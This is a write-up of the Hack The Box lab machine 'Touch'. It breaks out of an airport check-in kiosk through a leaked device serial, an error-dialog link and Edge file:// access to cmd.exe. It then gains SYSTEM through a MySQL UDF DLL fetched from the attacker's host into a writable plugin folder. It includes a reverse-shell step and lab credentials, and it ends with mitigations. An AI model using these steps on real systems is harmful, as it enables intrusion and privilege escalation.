---
title: "Touch"
date: 2026-10-07
os: Windows
difficulty: Easy
tags: [htb-airways, kiosk-breakout, credential-exposure, browser-escape, mysql-udf-privesc]
summary: "Breaking out of a locked-down airport check-in kiosk via a leaked device API credential and a browser escape, then escalating to SYSTEM through a MySQL UDF privesc."
platform: HTB
status: active
# unlock_date: 2026-XX-XX   # <- fecha de retiro en HTB; al ponerla sale el contador
---

[Touch](https://app.hackthebox.com/machines/Touch?sort_by=created_at&sort_type=desc)

## Machine Information

| | |
|---|---|
| **Name** | Touch |
| **Difficulty** | Easy |
| **OS** | Windows |

Carried over from Layover: a name and a booking confirmation code sniffed out of that machine's Wi-Fi traffic — **Jenny Crawford** / **KS7X2M**. Touch picks up as the next stop in the same HTB Airways story, and this is exactly what gets me through the airport kiosk's check-in flow later on.

> TODO: the Layover writeup doesn't currently document the step where Jenny's full name and booking code were recovered — it only shows her portal login (`jenny` / `Fl1ghtDeck2026!`). Fill that in over there so the two writeups actually connect.

---

## Mapping the Box

Connectivity check first, as always:

```bash
ping -c4 touch.htb
```

![](/assets/machines/touch/pasted-image-20261007003753.png)

It's reachable. Version/script scan next:

```bash
nmap -sV -sC -Pn touch.htb
```

![](/assets/machines/touch/pasted-image-20261007004114.png)

Four ports: 135 (MSRPC), 3389 (RDP), 5985, and 8443 — both 5985 and 8443 reported as `Microsoft HTTPAPI httpd 2.0`, with 8443 redirecting to `/login`. A web login on a non-standard HTTPS port plus RDP is a pretty typical "kiosk management" fingerprint, so I went straight at the web app.

```bash
ffuf -c -u http://touch.htb:8443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 302
```

![](/assets/machines/touch/pasted-image-20261007004642.png)

Two hits: `login` (expected) and `api` (403 — exists, but not accessible without more specific paths). Switched wordlists to something API-focused and fuzzed under `/api/`:

```bash
ffuf -c -u http://touch.htb:8443/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -fc 302
```

![](/assets/machines/touch/pasted-image-20261007004840.png)

That turned up `status`, returning `200` with no authentication required.

---

## Getting Into the Kiosk

### An Open API Leaks the Keys to the Dashboard

Browsed straight to the discovered endpoint:

```bash
curl -sk https://touch.htb:8443/api/status
```

![](/assets/machines/touch/pasted-image-20261007004901.png)

No auth needed, and it leaked device details for the management platform itself: `"device": "Nexion DeviceHub DH-100"`, `"serial": "NX-DH-2024-B7042"`, firmware version, and status. That's the actual bug here — an API endpoint that's supposed to be internal (or at least gated) hands out identifying device info to anyone who asks.

Here's why that matters: the DeviceHub login/pairing screen accepts the device's own serial number as its credential — a "something you have, except it's also published by the device itself" design flaw. Serial in hand, I was straight into the dashboard:

![](/assets/machines/touch/pasted-image-20261007005059.png)

"Nexion DeviceHub — Gate B7, Kiosk #042," showing the connected Passport Scanner and Boarding Pass Printer, both online. Digging into the scanner's own device page exposed its RDP-style login credentials directly in the UI (username/password fields with a "show" toggle — stored and displayed in plaintext, not even masked server-side):

![](/assets/machines/touch/pasted-image-20261007005401.png)

That's `KioskUser`, with its password displayed in plaintext right there in the UI — exactly the kind of credential exposure an unauthenticated, passenger-facing API should never have made possible. And here's why it escalates the way it does: a passport scanner's management credentials are also, in practice, the login for the Windows account running the kiosk application itself — which is exactly what I used next.

### RDPing In as KioskUser

```bash
xfreerdp3 /v:touch.htb /u:KioskUser
```

![](/assets/machines/touch/pasted-image-20261007010032.png)

Landed straight in the HTB Airways self-check-in kiosk app, running full-screen in what's clearly meant to be a locked-down, touch-only interface — "Terminal 4, Gate B7, Kiosk #042."

![](/assets/machines/touch/pasted-image-20261007010457.png)

Used Jenny's booking code from Layover (`KS7X2M`) to move through the check-in flow, and got to the document verification step, which wants a passport scan:

![](/assets/machines/touch/pasted-image-20261007010657.png)

The scanner wouldn't read anything — expected, since there's no real hardware attached to this session — and it just kept retrying and counting down a timeout.

### Breaking Out of the Locked-Down Shell

While poking around the DeviceHub dashboard from earlier, I noticed the scanner could be toggled with a "Power Off" control. Flipping that mid-scan felt worth a shot — it should force the kiosk's client-side error handling to actually run instead of just silently retrying:

![](/assets/machines/touch/pasted-image-20261007020348.png)

With the scanner reporting OFFLINE, the kiosk app threw a hardware error dialog instead of its usual retry loop — and that dialog came with a live, clickable support URL:

![](/assets/machines/touch/pasted-image-20261007020450.png)

There's the breakout vector: a "locked" kiosk application rendering a clickable hyperlink inside an embedded browser control. Clicking it escaped the kiosk's fullscreen shell entirely and dropped me into a real, chrome-and-all Edge window:

![](/assets/machines/touch/pasted-image-20261007020602.png)

From a full browser, getting a shell is just a matter of abusing Edge's own `file://` handling. Navigating to the local filesystem and "downloading" `cmd.exe` through the browser's download manager sidesteps whatever was stopping me from launching it directly:

```text
file:///C:/Windows/System32/cmd.exe
```

![](/assets/machines/touch/pasted-image-20261007020842.png)

Opening the downloaded file from Edge's Downloads panel ran it, breaking me out of the kiosk shell completely and into a normal interactive `cmd.exe`. User flag was sitting right on the desktop:

```cmd
type C:\Users\KioskUser\Desktop\user.txt
```

![](/assets/machines/touch/pasted-image-20261007021015.png)

A raw `cmd.exe` window works, but it's clunky, so I upgraded to a proper reverse shell for comfort — base64-encoded a PowerShell one-liner and caught it with a listener:

```powershell
powershell -e <base64-encoded-payload>
```

```bash
penelope -p 4445
```

![](/assets/machines/touch/pasted-image-20261007021732.png)

![](/assets/machines/touch/pasted-image-20261007021745.png)

Interactive session as `kiosk-042\kioskuser`.

---

## Poking Around Once I Had a Real Shell

With a real shell, I started looking at what was actually installed on `C:\`:

```powershell
ls C:\
```

![](/assets/machines/touch/pasted-image-20261007023837.png)

`MySQL` and an `HTB Airways` application directory under Program Files stood out immediately. Digging through the kiosk app's own backend code turned up hardcoded database credentials:

```powershell
cat "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
```

![](/assets/machines/touch/pasted-image-20261007201248.png)

The code reads a fallback config path from `C:\ProgramData\HTB Airways\db-config.ini` if an environment variable isn't set, but ships hardcoded defaults in the source itself: user `kiosk_app`, password `K!0sk_R3pl1ca#DB`, database `htb_airways`.

```powershell
mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -e "show databases;"
```

![](/assets/machines/touch/pasted-image-20261007201943.png)

```powershell
mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -e "use htb_airways; show tables;"
```

![](/assets/machines/touch/pasted-image-20261007202153.png)

Plenty of airline-flavored tables — `_htb_staff`, `bookings`, `flights`, `passengers`, `boarding_passes`, and so on. The staff table looked like the best bet for finding something privesc-relevant:

```powershell
mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -e "use htb_airways; describe _htb_staff;"
```

![](/assets/machines/touch/pasted-image-20261007203322.png)

```powershell
mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -e "select employee_id, first_name, email, auth_code, role, active, notes from _htb_staff;"
```

![](/assets/machines/touch/pasted-image-20261007203254.png)

| Employee ID | Name   | Email                                                           | Auth Code        | Role                         |
| ----------- | ------ | --------------------------------------------------------------- | ---------------- | ---------------------------- |
| HTB-97248   | Marcus | [mmitchell@htbairways.htb](mailto:mmitchell@htbairways.htb)     | 4601947A40E4BDCE | Cargo Supervisor             |
| HTB-80469   | Elena  | [ekovacs@htbairways.htb](mailto:ekovacs@htbairways.htb)         | D4E96DB85AECAFC4 | First Officer                |
| HTB-98398   | David  | [dandersen@htbairways.htb](mailto:dandersen@htbairways.htb)     | 255160EA80AF52CC | Senior Check-in Agent        |
| HTB-25469   | Sarah  | [snakamura@htbairways.htb](mailto:snakamura@htbairways.htb)     | 65BBA59D1B5145E7 | First Officer                |
| HTB-76155   | James  | [jokonkwo@htbairways.htb](mailto:jokonkwo@htbairways.htb)       | EA42FAB8CAE50D63 | Maintenance Technician       |

*(32 rows total — trimmed here to a representative sample since none of them led anywhere; the full table is in the database if needed.)*

Turned out none of this was related to privilege escalation — no password hashes, just employee auth codes with no obvious way to use them against the host itself. Dead end, but worth ruling out properly instead of just assuming.

---

## From kiosk-042\kioskuser to SYSTEM via a MySQL UDF

Back to the application's files, since the database itself hadn't paid off. Found a scheduled-task-looking batch script that refreshes data in the database:

```powershell
cat "C:\ProgramData\HTB Airways\refresh-dates.bat"
```

![](/assets/machines/touch/pasted-image-20261007204526.png)

```batch
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

The MySQL **root** password, sitting in plaintext in a batch file meant to be run by a scheduled task. With root on the database, I checked whether it had `FILE_PRIV` — the MySQL privilege that governs whether an account can read/write files on the underlying filesystem through the database engine itself:

```powershell
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, File_priv FROM mysql.user;"
```

![](/assets/machines/touch/pasted-image-20261007204726.png)

`root` has `File_priv = Y`. That alone is interesting, but the real win is combining it with filesystem permissions on MySQL's plugin directory — if that directory is writable by my current (non-admin) user, I can drop a malicious UDF (User-Defined Function) library there and load it directly from SQL, which turns "I can write files" into "I can execute arbitrary code as whatever account the MySQL service runs under."

```powershell
icacls "C:\MySQL\lib\plugin"
```

![](/assets/machines/touch/pasted-image-20261007205706.png)

And there it is: `NT AUTHORITY\Authenticated Users:(M)` — Modify rights on the plugin directory, inherited down from a parent ACL that was clearly never meant to be this permissive. `NT AUTHORITY\SYSTEM` also shows up with Full Control, but that's not the interesting part — SYSTEM having full control over its own install directory is normal. What matters is that *any authenticated user*, including the low-privileged kiosk account I was sitting in, can drop files into a directory MySQL will happily load code from. Classic MySQL UDF privesc setup, and HackTricks has the reference writeup for exactly this technique.

Hosted a prebuilt `lib_mysqludf_sys` DLL on my attack box and pulled it down straight into the plugin folder:

```powershell
Invoke-WebRequest -Uri http://10.10.15.55:8001/lib_mysqludf_sys_64.dll -OutFile "C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll"
```

![](/assets/machines/touch/pasted-image-20261007213810.png)

Then registered it as a SQL function:

```powershell
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
```

![](/assets/machines/touch/pasted-image-20261007213746.png)

`sys_eval` is the DLL's exported function — it shells out to `cmd.exe` under the hood and returns whatever the command printed. Tested it with `whoami`:

```powershell
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"
```

![](/assets/machines/touch/pasted-image-20261007214212.png)

The result came back as a hex-encoded blob rather than plain text — MySQL's CLI does this whenever a `STRING` result contains bytes it treats as binary rather than a clean printable charset, which a UDF's raw return buffer often does. Decoded it by hand with `xxd` to confirm the command actually ran:

```bash
echo "0x6E7420617574686F726974795C73797374656D" | xxd -r
```

![](/assets/machines/touch/pasted-image-20261007214414.png)

`nt authority\system` — the MySQL service itself runs as SYSTEM, so any command executed through `sys_eval()` runs with SYSTEM privileges, regardless of which low-privileged account is talking to the database. That's the whole escalation in one sentence: writable plugin directory + `FILE_PRIV` turns a database login into full SYSTEM code execution.

With that confirmed, reading the root flag was just one more call to the same function:

```powershell
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" < C:\MySQL\q.sql
```

where `q.sql` contained:

```sql
SELECT sys_eval('cmd /c type C:\Users\Administrator\Desktop\root.txt');
```

![](/assets/machines/touch/pasted-image-20261007215606.png)

Machine owned, SYSTEM all the way.

---

## Flags

- **User:** `C:\Users\KioskUser\Desktop\user.txt`, retrieved right after breaking out of the self-check-in kiosk app into a real `cmd.exe`.
- **Root:** `C:\Users\Administrator\Desktop\root.txt`, read as SYSTEM through a malicious MySQL UDF loaded from a world-writable plugin directory.

---

## Lessons Learned / Mitigation

- **An unauthenticated API endpoint leaked the device's own serial number, and that serial doubled as a login credential.** Device identity and device authentication should never be the same value — anything an attacker can read for free shouldn't also be able to log them in.
- **A kiosk's device-management dashboard displayed RDP credentials in plaintext, with no server-side masking.** Credentials shown in an admin UI should at minimum require a secondary confirmation step to reveal, and ideally shouldn't be retrievable in plaintext at all after initial provisioning.
- **The "locked down" kiosk application rendered a clickable hyperlink inside its embedded browser control during an error state.** Kiosk/lockdown software needs to assume every code path can eventually render attacker-reachable content — including error dialogs — and strip or neutralize anything clickable, not just the main UI.
- **Edge's `file://` handling combined with its download manager let a sandboxed/locked browser session reach and execute `cmd.exe`.** Kiosk browsers should run with `file://` navigation disabled entirely and with application whitelisting (like AppLocker) enforced at the OS level, so even a successful browser escape can't launch arbitrary binaries.
- **A deployment batch script stored the MySQL root password in plaintext**, and the MySQL plugin directory was writable by `Authenticated Users` — a group that includes basically every logged-in account on the box. Service credentials belong in a secrets manager or at minimum a tightly-ACL'd file, and a database engine's plugin/library directories should only ever be writable by the account that owns the service itself.
